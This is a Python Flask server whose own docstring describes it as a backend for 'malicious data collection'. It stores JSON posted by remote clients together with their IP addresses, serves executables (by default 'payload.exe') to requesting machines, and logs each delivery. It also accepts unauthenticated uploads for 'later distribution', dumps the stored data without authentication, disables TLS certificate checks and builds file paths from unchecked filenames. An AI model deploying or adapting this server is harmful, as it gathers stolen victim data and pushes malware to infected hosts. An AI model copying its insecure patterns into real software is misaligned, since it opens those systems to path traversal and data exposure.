"""
Backend Server for Malicious Data Collection
- Receives JSON data and stores in Aiven Cloud PostgreSQL Database
- Handles file transfers (exe files)
"""

import os
import json
import mysql.connector
from mysql.connector import Error
from flask import Flask, request, jsonify, send_file
from dotenv import load_dotenv
from datetime import datetime
import logging
import ssl

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

# Database configuration from .env (MySQL/Aiven)
DB_CONFIG = {
    'host': os.getenv('DB_HOST'),
    'port': int(os.getenv('DB_PORT', 21011)),
    'user': os.getenv('DB_USER'),
    'password': os.getenv('DB_PASSWORD'),
    'database': os.getenv('DB_NAME'),
    'ssl_disabled': False,
    'ssl_verify_cert': False
}

# Server configuration
PORT = int(os.getenv('PORT', 5000))


def get_db_connection():
    """Create and return a database connection"""
    try:
        conn = mysql.connector.connect(**DB_CONFIG)
        return conn
    except Error as e:
        logger.error(f"Database connection error: {e}")
        raise


def init_database():
    """Initialize database tables if they don't exist"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        # Create table for storing received data
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS received_data (
                id INT AUTO_INCREMENT PRIMARY KEY,
                data JSON NOT NULL,
                source_ip VARCHAR(50),
                received_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                data_type VARCHAR(100)
            )
        """)
        
        # Create table for file transfer logs
        cursor.execute("""
            CREATE TABLE IF NOT EXISTS file_transfers (
                id INT AUTO_INCREMENT PRIMARY KEY,
                filename VARCHAR(255) NOT NULL,
                target_ip VARCHAR(50),
                transferred_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                status VARCHAR(50) DEFAULT 'pending'
            )
        """)
        
        conn.commit()
        cursor.close()
        conn.close()
        logger.info("Database tables initialized successfully")
    except Exception as e:
        logger.error(f"Database initialization error: {e}")
        raise


# ==================== DATA RECEIVING ENDPOINTS ====================

@app.route('/api/receive', methods=['POST'])
def receive_data():
    """
    Endpoint to receive JSON data and store in database
    Expected: JSON body with any structure
    """
    try:
        # Get JSON data from request
        if not request.is_json:
            return jsonify({'error': 'Content-Type must be application/json'}), 400
        
        data = request.get_json()
        
        if not data:
            return jsonify({'error': 'No data provided'}), 400
        
        # Get client IP
        source_ip = request.remote_addr
        
        # Get optional data type from query params
        data_type = request.args.get('type', 'general')
        
        # Store in database
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute(
            """
            INSERT INTO received_data (data, source_ip, data_type, received_at)
            VALUES (%s, %s, %s, %s)
            """,
            (json.dumps(data), source_ip, data_type, datetime.now())
        )
        
        record_id = cursor.lastrowid
        conn.commit()
        cursor.close()
        conn.close()
        
        logger.info(f"Data received and stored with ID: {record_id} from {source_ip}")
        
        return jsonify({
            'status': 'success',
            'message': 'Data received and stored',
            'id': record_id
        }), 201
        
    except json.JSONDecodeError as e:
        return jsonify({'error': f'Invalid JSON: {str(e)}'}), 400
    except Error as e:
        logger.error(f"Database error: {e}")
        return jsonify({'error': 'Database error'}), 500
    except Exception as e:
        logger.error(f"Error receiving data: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/receive/batch', methods=['POST'])
def receive_batch_data():
    """
    Endpoint to receive multiple JSON records at once
    Expected: JSON array of objects
    """
    try:
        if not request.is_json:
            return jsonify({'error': 'Content-Type must be application/json'}), 400
        
        data_list = request.get_json()
        
        if not isinstance(data_list, list):
            return jsonify({'error': 'Expected JSON array'}), 400
        
        source_ip = request.remote_addr
        data_type = request.args.get('type', 'batch')
        
        conn = get_db_connection()
        cursor = conn.cursor()
        
        inserted_ids = []
        for data in data_list:
            cursor.execute(
                """
                INSERT INTO received_data (data, source_ip, data_type, received_at)
                VALUES (%s, %s, %s, %s)
                """,
                (json.dumps(data), source_ip, data_type, datetime.now())
            )
            inserted_ids.append(cursor.lastrowid)
        
        conn.commit()
        cursor.close()
        conn.close()
        
        logger.info(f"Batch data received: {len(inserted_ids)} records from {source_ip}")
        
        return jsonify({
            'status': 'success',
            'message': f'{len(inserted_ids)} records stored',
            'ids': inserted_ids
        }), 201
        
    except Exception as e:
        logger.error(f"Error receiving batch data: {e}")
        return jsonify({'error': str(e)}), 500


# ==================== FILE TRANSFER ENDPOINTS ====================

# Directory for storing executable files
FILES_DIR = os.path.join(os.path.dirname(__file__), 'files')

@app.route('/api/transfer/file', methods=['GET'])
def transfer_file():
    """
    Endpoint to transfer executable file to client
    Query params: filename (optional, defaults to payload.exe)
    """
    try:
        filename = request.args.get('filename', 'payload.exe')
        file_path = os.path.join(FILES_DIR, filename)
        
        if not os.path.exists(file_path):
            return jsonify({'error': 'File not found'}), 404
        
        # Log the transfer
        target_ip = request.remote_addr
        
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute(
            """
            INSERT INTO file_transfers (filename, target_ip, status, transferred_at)
            VALUES (%s, %s, %s, %s)
            """,
            (filename, target_ip, 'completed', datetime.now())
        )
        
        conn.commit()
        cursor.close()
        conn.close()
        
        logger.info(f"File '{filename}' transferred to {target_ip}")
        
        return send_file(
            file_path,
            as_attachment=True,
            download_name=filename
        )
        
    except Exception as e:
        logger.error(f"Error transferring file: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/api/transfer/upload', methods=['POST'])
def upload_file():
    """
    Endpoint to upload files to server (for later distribution)
    """
    try:
        if 'file' not in request.files:
            return jsonify({'error': 'No file provided'}), 400
        
        file = request.files['file']
        
        if file.filename == '':
            return jsonify({'error': 'No file selected'}), 400
        
        # Ensure files directory exists
        os.makedirs(FILES_DIR, exist_ok=True)
        
        # Save the file
        file_path = os.path.join(FILES_DIR, file.filename)
        file.save(file_path)
        
        logger.info(f"File '{file.filename}' uploaded successfully")
        
        return jsonify({
            'status': 'success',
            'message': 'File uploaded',
            'filename': file.filename
        }), 201
        
    except Exception as e:
        logger.error(f"Error uploading file: {e}")
        return jsonify({'error': str(e)}), 500


# ==================== UTILITY ENDPOINTS ====================

@app.route('/api/health', methods=['GET'])
def health_check():
    """Health check endpoint"""
    try:
        # Test database connection
        conn = get_db_connection()
        cursor = conn.cursor()
        cursor.execute("SELECT 1")
        cursor.fetchall()  # Consume the result
        cursor.close()
        conn.close()
        
        return jsonify({
            'status': 'healthy',
            'database': 'connected',
            'timestamp': datetime.now().isoformat()
        }), 200
    except Exception as e:
        return jsonify({
            'status': 'unhealthy',
            'database': 'disconnected',
            'error': str(e)
        }), 500


@app.route('/api/data', methods=['GET'])
def get_all_data():
    """Retrieve all stored data (for testing/admin purposes)"""
    try:
        conn = get_db_connection()
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT id, data, source_ip, data_type, received_at 
            FROM received_data 
            ORDER BY received_at DESC
            LIMIT 100
        """)
        
        rows = cursor.fetchall()
        cursor.close()
        conn.close()
        
        data = []
        for row in rows:
            data.append({
                'id': row[0],
                'data': row[1],
                'source_ip': row[2],
                'data_type': row[3],
                'received_at': row[4].isoformat() if row[4] else None
            })
        
        return jsonify({'data': data, 'count': len(data)}), 200
        
    except Exception as e:
        logger.error(f"Error retrieving data: {e}")
        return jsonify({'error': str(e)}), 500


@app.route('/', methods=['GET'])
def index():
    """Root endpoint"""
    return jsonify({
        'message': 'Backend Server Running',
        'endpoints': {
            'receive_data': 'POST /api/receive',
            'receive_batch': 'POST /api/receive/batch',
            'transfer_file': 'GET /api/transfer/file?filename=<name>',
            'upload_file': 'POST /api/transfer/upload',
            'health_check': 'GET /api/health',
            'get_data': 'GET /api/data'
        }
    }), 200


if __name__ == '__main__':
    # Ensure files directory exists
    os.makedirs(FILES_DIR, exist_ok=True)
    
    # Initialize database tables
    try:
        init_database()
    except Exception as e:
        logger.warning(f"Could not initialize database: {e}")
    
    # Run the server
    logger.info(f"Starting server on port {PORT}")
    app.run(
        host='0.0.0.0',
        port=PORT,
        debug=os.getenv('NODE_ENV') == 'development'
    )
